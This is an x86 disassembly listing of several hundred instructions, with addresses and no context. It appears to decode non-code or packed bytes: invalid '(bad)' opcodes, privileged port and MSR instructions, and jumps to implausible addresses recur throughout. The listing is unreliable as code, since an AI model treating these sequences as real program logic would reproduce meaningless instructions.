  415e06:	or     DWORD PTR [eax-0x72],edx
  415e09:	bound  edx,QWORD PTR [ecx-0x54]
  415e0c:	xchg   esp,eax
  415e0d:	push   ebp
  415e0e:	aad    0x66
  415e10:	cwde   
  415e11:	and    eax,0x3a2909af
  415e16:	std    
  415e17:	aaa    
  415e18:	(bad)  
  415e1a:	retf   0x68cf
  415e1d:	out    0x6e,eax
  415e1f:	in     al,dx
  415e20:	xchg   edi,eax
  415e21:	idiv   BYTE PTR [ebp+ebx*4-0x44e436ce]
  415e28:	(bad)  
  415e29:	iret   
  415e2a:	jle    0x415e39
  415e2c:	push   es
  415e2d:	icebp  
  415e2e:	ins    BYTE PTR es:[edi],dx
  415e2f:	or     edi,DWORD PTR [edi-0x6a3f6975]
  415e35:	outs   dx,BYTE PTR ds:[esi]
  415e36:	pop    ecx
  415e37:	add    ch,al
  415e39:	outs   dx,DWORD PTR ds:[esi]
  415e3a:	retf   
  415e3b:	std    
  415e3c:	(bad)  
  415e3d:	pop    eax
  415e3e:	add    eax,0xac10a4f0
  415e43:	out    0x11,al
  415e45:	inc    esp
  415e46:	cs xor dl,al
  415e49:	shr    BYTE PTR [ecx],1
  415e4b:	pop    esi
  415e4c:	dec    eax
  415e4d:	jae    0x415e86
  415e4f:	popf   
  415e50:	xor    esp,edi
  415e52:	inc    edx
  415e53:	ds push ds
  415e55:	add    ecx,DWORD PTR [esi+0x30e01fb3]
  415e5b:	xlat   BYTE PTR ds:[ebx]
  415e5c:	loopne 0x415ebf
  415e5e:	mov    dh,0x22
  415e60:	int3   
  415e61:	jmp    FWORD PTR [ecx]
  415e63:	sub    cl,al
  415e65:	or     BYTE PTR [eax-0x20],0x5c
  415e69:	in     eax,dx
  415e6a:	(bad)
  415e6d:	jecxz  0x415e9d
  415e6f:	inc    edi
  415e70:	sub    ch,bl
  415e72:	daa    
  415e73:	jmp    0x415e35
  415e75:	jnp    0x415e83
  415e77:	sbb    bl,ch
  415e79:	push   ebp
  415e7a:	xchg   DWORD PTR [esi],ebx
  415e7c:	cdq    
  415e7d:	call   0xb6e35c91
  415e82:	int    0x10
  415e84:	ins    DWORD PTR es:[edi],dx
  415e85:	inc    BYTE PTR [edx]
  415e87:	xchg   ah,dl
  415e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e8a:	mov    eax,0xeed33ccc
  415e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e90:	imul   BYTE PTR [esi-0x21128942]
  415e96:	and    dh,BYTE PTR [esi-0x53f693d8]
  415e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e9d:	add    eax,0xf3db8cfc
  415ea2:	push   edx
  415ea3:	mov    edx,0xe83c734c
  415ea8:	rol    DWORD PTR [esi-0x7df59bf5],0xb2
  415eaf:	retf   
  415eb0:	rcl    BYTE PTR [ecx-0x3d179062],0xf4
  415eb7:	adc    al,0x96
  415eb9:	ret    0x506
  415ebc:	lahf   
  415ebd:	xor    eax,DWORD PTR [ebp-0x7416362]
  415ec3:	lods   eax,DWORD PTR ds:[esi]
  415ec4:	adc    eax,0x6008a709
  415ec9:	es retf 
  415ecb:	fnstcw WORD PTR [esp+eax*4]
  415ece:	jnp    0x415f1e
  415ed0:	imul   edx
  415ed2:	icebp  
  415ed3:	mov    ah,0x32
  415ed5:	loopne 0x415f50
  415ed7:	inc    eax
  415ed8:	push   ds
  415ed9:	cli    
  415eda:	push   ebx
  415edb:	and    DWORD PTR [esi+0x31],edx
  415ede:	neg    esi
  415ee0:	pop    ebp
  415ee1:	aad    0x6c
  415ee3:	pandn  mm5,QWORD PTR [eax-0x3f4a421b]
  415eea:	loop   0x415e80
  415eec:	daa    
  415eed:	in     eax,dx
  415eee:	ror    DWORD PTR [ebp+eax*2-0x36561ff4],0xca
  415ef6:	das    
  415ef7:	cmp    BYTE PTR [ebp-0x7f1fc381],cl
  415efd:	(bad)  
  415efe:	mov    edx,0x701476e4
  415f03:	pushf  
  415f04:	js     0x415ef8
  415f06:	push   eax
  415f07:	(bad)  
  415f08:	adc    al,0x5c
  415f0a:	xor    eax,DWORD PTR [ebx+0x13]
  415f0d:	lods   al,BYTE PTR ds:[esi]
  415f0e:	dec    edx
  415f10:	adc    ch,BYTE PTR [ebx-0x5d273120]
  415f16:	mov    esi,0x339bbb29
  415f1b:	ins    BYTE PTR es:[edi],dx
  415f1c:	xor    DWORD PTR [esi],esp
  415f1e:	test   DWORD PTR [ebx+0x1af23596],0x691830b1
  415f28:	add    DWORD PTR [ecx-0x33],esp
  415f2b:	xchg   esp,eax
  415f2c:	lods   al,BYTE PTR ds:[esi]
  415f2d:	push   cs
  415f2e:	out    dx,eax
  415f2f:	or     al,0x44
  415f31:	fist   WORD PTR [edx+0x50]
  415f34:	out    0xaa,al
  415f36:	xchg   ecx,eax
  415f38:	xlat   BYTE PTR ds:[ebx]
  415f39:	call   0x910c415c
  415f3e:	jbe    0x415f40
  415f40:	pusha  
  415f41:	and    al,0xca
  415f43:	inc    esp
  415f44:	outs   dx,BYTE PTR ds:[esi]
  415f45:	push   ss
  415f46:	mov    esp,0xeecd1950
  415f4b:	mov    esi,0xf7b7833a
  415f50:	fnstenv [ebx]
  415f52:	icebp  
  415f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f54:	cmp    BYTE PTR fs:[ecx-0x5d],0x9c
  415f59:	out    dx,eax
  415f5a:	ror    DWORD PTR [esi+0x1f995967],cl
  415f60:	xor    eax,0xb00a7921
  415f65:	hlt    
  415f66:	test   al,0x4a
  415f68:	shl    BYTE PTR [esi-0x7e],0xc3
  415f6c:	push   0x64
  415f6e:	mov    al,ds:0x56ec1224
  415f73:	test   BYTE PTR [esi-0xf],dl
  415f76:	aaa    
  415f77:	js     0x415f1e
  415f79:	out    dx,eax
  415f7a:	mov    edi,DWORD PTR [esi]
  415f7c:	enter  0x9dea,0x4b
  415f80:	shl    DWORD PTR [ecx],cl
  415f82:	in     eax,0x34
  415f84:	mov    bh,0xf0
  415f86:	sahf   
  415f87:	and    BYTE PTR [eax+0x7b509a35],bl
  415f8d:	fisttp QWORD PTR [edi+0xec664e0]
  415f93:	bound  ecx,QWORD PTR [ebp+0x566fab39]
  415f99:	mov    bl,0x17
  415f9b:	push   ss
  415f9c:	stos   DWORD PTR es:[edi],eax
  415f9d:	test   eax,0x3cecbb4d
  415fa2:	cld    
  415fa3:	fimul  WORD PTR [edx+0x2605d447]
  415fa9:	mov    cl,0x59
  415fab:	add    ah,BYTE PTR [edx+0x1]
  415fae:	pop    esp
  415faf:	adc    BYTE PTR [esi-0x2bb99e70],bh
  415fb5:	retf   
  415fb6:	das    
  415fb7:	push   ecx
  415fb8:	jmp    0x46019a3c
  415fbd:	ret    0x66aa
  415fc0:	dec    edx
  415fc1:	lods   al,BYTE PTR ds:[esi]
  415fc2:	js     0x416006
  415fc4:	jecxz  0x415f4b
  415fc6:	or     al,0xbf
  415fc8:	in     eax,dx
  415fc9:	jne    0x415fc3
  415fcb:	jmp    0x415f4d
  415fcd:	mov    dh,0x96
  415fcf:	ret    
  415fd0:	push   ebp
  415fd1:	and    BYTE PTR [edx+0x7a],bh
  415fd4:	mov    edi,0xa2116443
  415fd9:	sub    ecx,ecx
  415fdb:	and    DWORD PTR [edx-0x5],edi
  415fde:	stos   DWORD PTR es:[edi],eax
  415fdf:	pop    es
  415fe0:	or     ch,BYTE PTR [edx-0x7e835088]
  415fe6:	push   0xfffffffe
  415fe8:	pop    ecx
  415fe9:	fs retf 0x62a8
  415fed:	retf   
  415fee:	iret   
  415fef:	pop    ecx
  415ff0:	adc    ebp,DWORD PTR [ebx]
  415ff2:	pop    esi
  415ff4:	push   edx
  415ff5:	sbb    esi,esi
  415ff7:	out    dx,al
  415ff8:	jl     0x416076
  415ffa:	std    
  415ffb:	push   cs
  415ffc:	inc    eax
  415ffd:	inc    eax
  415ffe:	xor    al,0xad
  416000:	xor    BYTE PTR ds:0x18b6c82a,bl
  416006:	loopne 0x416015
  416008:	lods   eax,DWORD PTR ds:[esi]
  416009:	lock pop ds
  41600b:	xlat   BYTE PTR ds:[ebx]
  41600c:	and    al,0xe
  41600e:	xor    dl,BYTE PTR fs:[esi-0xe]
  416012:	repz shl dl,1
  416015:	push   ds
  416016:	es or  eax,0xe5168f91
  41601c:	sub    DWORD PTR [eax+0x49b61c77],edi
  416022:	and    DWORD PTR ds:0xe41cd2bc,eax
  416028:	or     bl,al
  41602a:	popa   
  41602b:	dec    DWORD PTR [ecx-0x80]
  41602e:	fbstp  TBYTE PTR [esi+ebp*4]
  416031:	mov    dl,0x4d
  416033:	mov    bl,0x19
  416035:	push   ss
  416036:	cmp    eax,0x7d01d1
  41603b:	stc    
  41603c:	fiadd  WORD PTR [esi-0x59]
  41603f:	adc    al,BYTE PTR [esi-0x4ae887c8]
  416045:	xchg   esi,eax
  416046:	std    
  416047:	jbe    0x41600e
  416049:	imul   esp,esi,0x386e8fc3
  41604f:	hlt    
  416050:	cmp    bl,BYTE PTR [ecx+0x10]
  416053:	inc    eax
  416054:	aas    
  416055:	ins    BYTE PTR es:[edi],dx
  416056:	mov    ch,0x51
  416058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416059:	aas    
  41605a:	add    ebx,DWORD PTR [ebx+eiz*8+0x416bfb4d]
  416061:	jmp    0x4160d8
  416063:	dec    DWORD PTR [edx-0x583bf93a]
  416069:	push   ecx
  41606a:	lahf   
  41606b:	arpl   WORD PTR [esi-0x3b174617],cx
  416071:	adc    esi,DWORD PTR [ebp-0x1d]
  416074:	xor    al,0x83
  416076:	shl    DWORD PTR [ebx-0x5b],0x17
  41607a:	int3   
  41607b:	xchg   esp,eax
  41607c:	data16 in al,dx
  41607e:	test   eax,0x1e6255db
  416083:	mul    cl
  416085:	or     eax,0xb76a45e4
  41608a:	outs   dx,BYTE PTR ds:[esi]
  41608b:	jns    0x41609e
  41608d:	cmp    eax,0x30c02c0e
  416092:	clc    
  416093:	call   0xff4a:0x11c5ad45
  41609a:	jae    0x4160fc
  41609c:	sub    eax,esp
  41609e:	addr16 xchg esp,eax
  4160a0:	int3   
  4160a1:	dec    ebx
  4160a2:	scas   al,BYTE PTR es:[edi]
  4160a3:	mov    eax,0x62687d4b
  4160a8:	ss mov al,0xe5
  4160ab:	add    al,0x91
  4160ad:	xchg   esi,eax
  4160ae:	mov    ebx,0x98dfdaa
  4160b3:	mov    DWORD PTR [ecx],esi
  4160b5:	div    BYTE PTR [ebx-0x5ea07e51]
  4160bb:	push   edi
  4160bc:	cwde   
  4160bd:	int3   
  4160be:	shl    DWORD PTR [ebx-0x3243e95d],0xed
  4160c5:	adc    eax,0x926bea6a
  4160ca:	call   0x12de32cb
  4160cf:	clc    
  4160d0:	mov    dl,0x1a
  4160d2:	cmp    al,0x9e
  4160d4:	or     BYTE PTR [edx],cl
  4160d6:	pop    es
  4160d7:	cmp    cl,0x7c
  4160da:	jle    0x41611a
  4160dc:	cmovbe eax,DWORD PTR [ecx+0x32]
  4160e0:	into   
  4160e1:	pop    eax
  4160e2:	mov    esp,0x69f01935
  4160e7:	xchg   edi,eax
  4160e8:	setns  BYTE PTR fs:[ebx+0x1c2362b4]
  4160f0:	dec    ebp
  4160f1:	and    BYTE PTR [ebx+ebp*1-0x13],al
  4160f5:	adc    al,0x31
  4160f7:	mov    ch,0xb5
  4160f9:	outs   dx,DWORD PTR ds:[esi]
  4160fa:	fst    st(4)
  4160fc:	inc    edi
  4160fd:	shl    BYTE PTR [edx+0x5ba55618],1
  416103:	fs pop ebx
  416105:	jp     0x41608b
  416107:	xlat   BYTE PTR ds:[ebx]
  416108:	mov    ecx,DWORD PTR [edi+0x6bedaaaa]
  41610e:	mul    DWORD PTR [esi+edi*4]
  416111:	sub    cl,bh
  416113:	cmp    dh,dl
  416115:	and    al,0xe3
  416117:	and    ah,BYTE PTR [ebp+0x48]
  41611a:	add    ch,cl
  41611c:	add    eax,0x72fe12ce
  416121:	add    BYTE PTR gs:[edi],ch
  416124:	sub    al,0x37
  416126:	push   es
  416127:	or     ch,BYTE PTR [ebp-0x7f516d5f]
  41612d:	loope  0x416120
  41612f:	dec    edx
  416130:	jp     0x41614b
  416132:	pop    edx
  416133:	sbb    DWORD PTR [eax],eax
  416135:	adc    al,0x11
  416137:	mov    bh,0x4e
  416139:	and    eax,0x1e1d69b5
  41613e:	jmp    0x4160f7
  416140:	lods   al,BYTE PTR ds:[esi]
  416141:	es xchg esp,eax
  416143:	mul    BYTE PTR [ebx]
  416145:	adc    DWORD PTR es:[ebx],esp
  416148:	xchg   ecx,eax
  416149:	mov    edi,esi
  41614b:	jg     0x41618b
  41614d:	fdiv   st,st(6)
  41614f:	std    
  416150:	pop    ebp
  416151:	adc    edx,DWORD PTR [ebp+0x15c7ba4e]
  416157:	psubb  mm4,mm6
  41615a:	sub    eax,0x7e4f4dea
  41615f:	test   ah,dh
  416161:	or     DWORD PTR [edi-0x540c89a5],edx
  416167:	mov    ebp,0x4699ba86
  41616c:	aaa    
  41616d:	in     eax,0x7c
  41616f:	xor    al,0x53
  416171:	adc    ch,0x9e
  416174:	xlat   BYTE PTR ds:[ebx]
  416175:	leave  
  416176:	repnz sub al,dl
  416179:	add    ebx,ecx
  41617b:	ficomp DWORD PTR [edi-0x609c7a91]
  416181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416182:	shr    BYTE PTR [ecx-0x62],0xbb
  416186:	ret    0xc850
  416189:	adc    DWORD PTR [ebx+eax*1],ebp
  41618c:	outs   dx,DWORD PTR ds:[esi]
  41618d:	out    0xcd,al
  41618f:	cld    
  416190:	or     eax,0x3298450d
  416195:	repnz (bad) 
  416197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416198:	adc    BYTE PTR [ebx+0xb3e79af],dh
  41619e:	xor    eax,0xbad939ae
  4161a3:	pop    esi
  4161a4:	loop   0x4161f4
  4161a6:	movq   mm4,mm0
  4161a9:	loopne 0x416151
  4161ab:	mov    dh,0xe3
  4161ad:	ss pop ds
  4161af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b0:	xor    al,0xca
  4161b2:	std    
  4161b3:	aaa    
  4161b4:	and    ebp,esp
  4161b6:	clc    
  4161b7:	bound  ebp,QWORD PTR [ecx]
  4161b9:	fcmovb st,st(1)
  4161bb:	test   eax,0x67c9cf3a
  4161c0:	push   ss
  4161c1:	stos   BYTE PTR es:[edi],al
  4161c2:	push   ecx
  4161c3:	and    al,0xec
  4161c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161c6:	pop    ebp
  4161c7:	pop    ecx
  4161c8:	push   0xbdfbfa24
  4161cd:	jns    0x41616f
  4161cf:	loop   0x4161b9
  4161d1:	jl     0x416203
  4161d3:	pop    edi
  4161d4:	add    ebx,DWORD PTR [esi-0x4300331c]
  4161da:	jae    0x416250
  4161dc:	push   edi
  4161dd:	xor    BYTE PTR [ebx],dh
  4161df:	dec    ecx
  4161e0:	jne    0x416202
  4161e2:	sbb    al,0x23
  4161e4:	bound  ecx,QWORD PTR [esi-0x75]
  4161e7:	inc    eax
  4161e8:	adc    dl,dh
  4161ea:	outs   dx,BYTE PTR ds:[esi]
  4161eb:	fxch   st(2)
  4161ed:	and    BYTE PTR [ecx-0x16866b11],dl
  4161f3:	dec    esi
  4161f4:	and    bl,BYTE PTR [edx]
  4161f6:	sbb    eax,0xf0a90328
  4161fb:	popa   
  4161fc:	jmp    0xd9fe6f2c
  416201:	and    DWORD PTR [edx],edx
  416203:	(bad)  
  416204:	jne    0x416260
  416206:	push   edi
  416207:	test   eax,0x8d448209
  41620c:	loope  0x4161a4
  41620e:	icebp  
  41620f:	mov    DWORD PTR [edx+0x270da7b2],edx
  416215:	imul   esp,DWORD PTR [ebx-0x3],0xffffffea
  416219:	inc    ebp
  41621a:	sub    DWORD PTR [eax+0x568bc27c],ebx
  416220:	xor    eax,0x4242f02f
  416225:	(bad)  
  416226:	popa   
  416227:	mov    al,ds:0xcfa60f5
  41622c:	mov    ebp,0x31e91b3
  416231:	or     eax,0xeab54c4a
  416236:	aas    
  416237:	inc    ebx
  416238:	aad    0x72
  41623a:	and    ebx,DWORD PTR [eax+0x469cde63]
  416240:	dec    edx
  416241:	cdq    
  416242:	scas   eax,DWORD PTR es:[edi]
  416243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416244:	add    eax,0x1524a38e
  416249:	out    dx,al
  41624a:	das    
  41624b:	xchg   WORD PTR [eax+0x1b85a26a],dx
  416252:	sub    edx,eax
  416254:	sbb    ebx,DWORD PTR [ebp-0x2efdf80d]
  41625a:	pop    ecx
  41625b:	popf   
  41625c:	mov    bl,0xb8
  41625e:	pop    ds
  41625f:	adc    BYTE PTR [eax+edx*8-0x83be3d5],dl
  416266:	mov    ds:0xc94e9f17,al
  41626b:	int3   
  41626c:	or     eax,0x8938126a
  416271:	(bad)  
  416272:	stos   DWORD PTR es:[edi],eax
  416273:	fsubr  QWORD PTR [eax+0x4034f479]
  416279:	cmp    al,0xf7
  41627b:	sbb    esi,0x5f
  41627e:	jbe    0x416257
  416280:	pop    es
  416281:	enter  0xca02,0xa0
  416285:	xchg   esp,eax
  416286:	adc    eax,0x4d50f679
  41628b:	and    DWORD PTR [ebx-0x314a0ff],ebx
  416291:	sbb    al,0x92
  416293:	jnp    0x41623f
  416295:	push   edi
  416296:	sub    al,0xeb
  416298:	js     0x4162b5
  41629a:	shl    DWORD PTR [ebp+0x56d61eb2],cl
  4162a0:	cwde   
  4162a1:	aas    
  4162a2:	fwait
  4162a3:	pop    es
  4162a4:	fwait
  4162a5:	mov    ds,WORD PTR [ebx-0x1d]
  4162a8:	retf   
  4162a9:	loope  0x416311
  4162ab:	out    0xce,al
  4162ad:	test   DWORD PTR [ebp+0x43],esp
  4162b0:	pop    ss
  4162b1:	setge  BYTE PTR [edx+0xb]
  4162b5:	or     DWORD PTR [edi-0x1e],ecx
  4162b8:	mov    al,ds:0x695cbed1
  4162bd:	and    eax,0x8cfe3f45
  4162c2:	aam    0xf5
  4162c4:	inc    eax
  4162c5:	xor    esp,esi
  4162c7:	jne    0x4162b6
  4162c9:	sti    
  4162ca:	inc    esp
  4162cb:	daa    
  4162cc:	wrmsr  
  4162ce:	aas    
  4162cf:	sahf   
  4162d0:	xchg   edi,eax
  4162d1:	xchg   ecx,eax
  4162d2:	xor    ecx,DWORD PTR [ecx]
  4162d4:	aam    0x36
  4162d6:	pusha  
  4162d7:	xchg   ecx,eax
  4162d8:	fstp   st(1)
  4162da:	xchg   DWORD PTR [edi],esi
  4162dc:	jae    0x416271
  4162de:	xchg   ecx,eax
  4162df:	arpl   WORD PTR [ecx-0x697998e9],si
  4162e5:	repz (bad) 
  4162e7:	hlt    
  4162e8:	xor    DWORD PTR [eax+0x61dfa877],ecx
  4162ee:	cdq    
  4162ef:	pop    edx
  4162f0:	pop    ebx
  4162f1:	pop    edx
  4162f2:	iret   
  4162f3:	adc    al,0x6d
  4162f5:	inc    esi
  4162f6:	aad    0x33
  4162f8:	lods   eax,DWORD PTR ds:[esi]
  4162f9:	and    DWORD PTR [edi-0x5fe614f5],0xffffffb0
  416300:	inc    ebx
  416301:	mov    bl,0x7
  416303:	repnz imul ecx,DWORD PTR [edx-0x3b47807d],0xffffffd9
  41630b:	(bad)  
  41630c:	and    eax,0x5b5aa184
  416311:	es push 0x4d
  416314:	xor    ebp,ebx
  416316:	push   ebx
  416317:	popa   
  416318:	fimul  DWORD PTR [ecx+0x1d5733cf]
  41631e:	lds    edi,FWORD PTR [edx]
  416320:	sub    eax,esp
  416322:	xchg   ebx,eax
  416323:	enter  0xd926,0x4c
  416327:	push   es
  416328:	cld    
  416329:	mov    eax,0xc3a16d1a
  41632e:	loopne 0x416362
  416330:	jne    0x4162f5
  416332:	jmp    0xb2e:0xd05b5847
  416339:	inc    ebx
  41633a:	(bad)  
  41633b:	pop    eax
  41633c:	imul   ecx,ebx,0x72
  41633f:	pop    edx
  416340:	push   esp
  416341:	(bad)  
  416343:	rcr    cl,cl
  416345:	mov    eax,ds:0x26a20d46
  41634a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41634b:	fstp   QWORD PTR [ecx-0x27bd981b]
  416351:	test   eax,0x4450f09d
  416356:	or     BYTE PTR [ecx+eiz*4-0x7545f644],0xd
  41635e:	push   ecx
  41635f:	lea    esi,[esi-0x19]
  416362:	inc    edx
  416363:	into   
  416364:	jecxz  0x4163c8
  416366:	or     al,0x7
  416368:	es push esp
  41636a:	daa    
  41636b:	jne    0x416394
  41636d:	lds    ebp,FWORD PTR [eax-0x1b34301d]
  416373:	pop    edx
  416374:	mov    esp,0xdde8550e
  416379:	pop    edi
  41637a:	jno    0x41630b
  41637c:	shr    edi,cl
  41637e:	call   FWORD PTR [ecx+ecx*1]
  416381:	adc    cl,BYTE PTR [ebx]
  416383:	es into 
  416385:	mov    DWORD PTR [ebx],esi
  416387:	adc    DWORD PTR [ecx+0x5d0193be],0x61
  41638e:	stos   BYTE PTR es:[edi],al
  41638f:	ficom  WORD PTR [ebx+eax*1-0x4c]
  416393:	pusha  
  416394:	fidivr WORD PTR [esi+0x4f538862]
  41639a:	retf   0x6907
  41639d:	and    DWORD PTR [edi+0x29abf1d3],edi
  4163a3:	scas   eax,DWORD PTR es:[edi]
  4163a4:	pop    eax
  4163a5:	or     al,0xf5
  4163a7:	int    0x28
  4163a9:	int    0xa7
  4163ab:	pop    esi
  4163ac:	out    0x6e,al
  4163ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163af:	sub    al,0x5b
  4163b1:	out    dx,al
  4163b2:	adc    ecx,DWORD PTR [ecx+0x3]
  4163b5:	sub    al,0xcf
  4163b7:	jecxz  0x416374
  4163b9:	jbe    0x416429
  4163bb:	shl    BYTE PTR [ecx+eax*1+0x15dbe3d2],cl
  4163c2:	jge    0x4163dd
  4163c4:	xchg   esp,eax
  4163c5:	mov    ds:0xa9e68476,al
  4163ca:	adc    eax,DWORD PTR [eax+0xce273ac]
  4163d0:	mov    al,ds:0xe7b0bc65
  4163d5:	imul   edi,DWORD PTR [ebp-0x3e],0xb64f9071
  4163dc:	inc    edx
  4163dd:	outs   dx,BYTE PTR ds:[esi]
  4163de:	adc    edx,ebx
  4163e0:	les    ecx,FWORD PTR [ecx+ecx*8+0x2b11bb8c]
  4163e7:	imul   edx,DWORD PTR [eax],0x7445cdd1
  4163ed:	adc    DWORD PTR [eax+edx*1],ebx
  4163f0:	jbe    0x4163d5
  4163f2:	scas   al,BYTE PTR es:[edi]
  4163f3:	test   BYTE PTR [ecx],dl
  4163f5:	xchg   ebx,eax
  4163f6:	jno    0x4163e3
  4163f8:	lds    esi,FWORD PTR [eax+edi*1-0x52]
  4163fc:	dec    eax
  4163fd:	aad    0x6d
  4163ff:	mov    esi,0xf8ba8f24
  416404:	(bad)  
  416405:	mov    al,0x12
  416407:	stc    
  416408:	adc    al,0x5c
  41640a:	nop
  41640b:	pop    ebp
  41640c:	(bad)  
  41640d:	ror    DWORD PTR [ecx-0x7431c555],1
  416413:	xchg   DWORD PTR gs:[bx+si],ecx
  416417:	dec    ebp
  416418:	sub    cl,al
  41641a:	cld    
  41641b:	or     BYTE PTR [edi],ah
  41641d:	push   0x5d
  41641f:	je     0x416481
  416421:	push   edi
  416422:	shl    BYTE PTR [ecx],1
  416424:	pop    edx
  416425:	(bad)  
  416426:	call   0x8c752cc5
  41642b:	xchg   esi,eax
  41642c:	js     0x4163cf
  41642e:	es cld 
  416430:	lahf   
  416431:	(bad)  
  416432:	(bad)  
  416433:	pop    ss
  416434:	xchg   esi,eax
  416435:	pop    ebx
  416436:	es mov dl,0xde
  416439:	mov    ds:0x5ca51b3d,eax
  41643e:	pushf  
  41643f:	ins    BYTE PTR es:[edi],dx
  416440:	and    edi,esi
  416442:	mov    esi,0x8ce968fe
  416447:	arpl   WORD PTR [esi-0x1bfb6241],ax
  41644d:	mov    al,ds:0x8b57561b
  416452:	fnstcw WORD PTR [eax]
  416454:	out    dx,eax
  416455:	pop    eax
  416456:	sti    
  416457:	and    al,0x89
  416459:	out    0x83,eax
  41645b:	sub    eax,0x6cf3116a
  416460:	add    DWORD PTR [eax],0xbac90956
  416466:	mov    eax,ecx
  416468:	mov    WORD PTR [esi+ebp*4+0x78da92c6],es
  41646f:	inc    esi
  416470:	xchg   ecx,eax
  416471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416472:	mov    ebx,0x6d0ce263
  416477:	jns    0x4164c7
  416479:	fwait
  41647a:	(bad)  
  41647b:	pop    esp
  41647c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41647d:	cli    
  41647e:	push   ss
  41647f:	sub    DWORD PTR [edx+0x3d],ebp
  416482:	stos   DWORD PTR es:[edi],eax
  416483:	and    DWORD PTR [esi],ebp
  416485:	fidivr DWORD PTR [ebx+esi*4+0x23698ebd]
  41648c:	retf   
  41648d:	(bad)  
  41648e:	sub    al,0x45
  416490:	mov    ds:0xad9afc66,al
  416495:	mov    ah,0x5a
  416497:	mov    BYTE PTR [ecx+0x42],cl
  41649a:	push   esp
  41649b:	push   esi
  41649c:	clc    
  41649d:	mov    ecx,0x319eb7be
  4164a2:	jmp    0xddbd15ba
  4164a7:	call   0xb0d0ad62
  4164ac:	repnz and BYTE PTR [ecx*8+0x589b2296],ah
  4164b4:	mov    al,ds:0xeeefa0d4
  4164b9:	cmp    dh,BYTE PTR [eax+0xe]
  4164bc:	js     0x4164ee
  4164be:	gs hlt 
  4164c0:	jg     0x41651f
  4164c2:	ror    BYTE PTR [eax-0x1e6ecbe],1
  4164c8:	(bad)  
  4164c9:	in     al,0x90
  4164cb:	or     BYTE PTR [eax+ecx*1+0x1c],cl
  4164cf:	mov    eax,DWORD PTR [ecx+0x20fe9540]
  4164d5:	mov    cl,0xe0
  4164d7:	mov    BYTE PTR [edi+0x6a2ecd35],bh
  4164dd:	or     edx,DWORD PTR [ebx+0x1a]
  4164e0:	adc    eax,0xa4992042
  4164e5:	mov    ds:0x29dde0fd,eax
  4164ea:	dec    esi
  4164eb:	int3   
  4164ec:	and    al,0x47
  4164ee:	sahf   
  4164ef:	and    al,0x5c
  4164f1:	(bad)  
  4164f2:	das    
  4164f3:	mov    bh,0xe7
  4164f5:	dec    eax
  4164f6:	dec    ebx
  4164f7:	cmp    dl,al
  4164f9:	jno    0x416481
  4164fb:	sar    BYTE PTR [eax],cl
  4164fd:	dec    esp
  4164fe:	cmp    al,0x8b
  416500:	daa    
  416501:	fbstp  TBYTE PTR [eax+eiz*1-0x1ad25c36]
  416508:	pop    ebx
  416509:	pop    edx
  41650a:	sbb    DWORD PTR [esi],esp
  41650c:	jg     0x4164de
  41650e:	enter  0x7a98,0x95
  416512:	mov    edi,0xbbe860dd
  416517:	mov    cl,0x5f
  416519:	mov    ebx,0x69a224d4
  41651e:	ror    BYTE PTR [edx+0x54],1
  416521:	adc    al,0x62
  416523:	or     al,0x79
  416525:	sti    
  416526:	lds    edx,FWORD PTR [ecx+0x40]
  416529:	mov    ds:0x4efb86b8,eax
  41652e:	fbstp  TBYTE PTR [edx]
  416530:	sti    
  416531:	push   ecx
  416532:	mov    eax,0x583d10f
  416537:	pop    edi
  416538:	jae    0x416584
  41653a:	sahf   
  41653b:	or     BYTE PTR [ecx-0x4f],0xa4
  41653f:	and    DWORD PTR [edi],esp
  416541:	inc    esi
  416542:	dec    edi
  416543:	fbstp  TBYTE PTR [eax+0x247fb0c1]
  416549:	nop
  41654a:	(bad)  
  41654b:	clc    
  41654c:	jecxz  0x416523
  41654e:	push   ebx
  41654f:	sbb    edx,DWORD PTR [edi+0x6a4fb8a9]
  416555:	sti    
  416556:	pop    esi
  416557:	mov    eax,ds:0xa2b00090
  41655c:	push   ds
  41655d:	lods   al,BYTE PTR ds:[esi]
  41655e:	push   esi
  41655f:	nop
  416560:	sub    DWORD PTR [ebx+0x69],esi
  416563:	xlat   BYTE PTR ds:[ebx]
  416564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416565:	xor    edx,ebx
  416567:	pop    ebx
  416568:	adc    BYTE PTR [esi],0x3f
  41656b:	pop    ss
  41656c:	ret    0x4c84
  41656f:	stos   BYTE PTR es:[edi],al
  416570:	test   DWORD PTR [ebx-0x228c8ad3],edi
  416576:	gs or  eax,0x1f3abeed
  41657c:	sub    DWORD PTR ds:0xb665c6e2,edx
  416582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416583:	xor    bh,BYTE PTR [edx+0x20]
  416586:	cld    
  416587:	shl    DWORD PTR [ecx+0x6c],cl
  41658a:	mov    dl,0xb5
  41658c:	mov    ds:0xbec9a47,eax
  416591:	ins    DWORD PTR es:[edi],dx
  416592:	cld    
  416593:	(bad)  
  416594:	fst    st(4)
  416596:	(bad)  
  416597:	je     0x41655b
  416599:	adc    DWORD PTR [ebp+0x45],0x76b0293c
  4165a0:	imul   esi,DWORD PTR [esi],0x3b
  4165a3:	jecxz  0x416594
  4165a5:	xchg   esp,eax
  4165a6:	fadd   DWORD PTR [ebx-0x7a]
  4165a9:	in     eax,dx
  4165aa:	and    eax,0x3d3314ea
  4165af:	push   edi
  4165b0:	mov    BYTE PTR [ecx+ecx*1-0x36],bh
  4165b4:	fistp  QWORD PTR [esi]
  4165b6:	pop    esp
  4165b7:	enter  0xad45,0xe6
  4165bb:	cmp    BYTE PTR [ebx+0x39b4cc5e],dh
  4165c1:	lahf   
  4165c2:	xor    bh,BYTE PTR [edi-0x6c2f57a5]
  4165c8:	jle    0x416584
  4165ca:	cld    
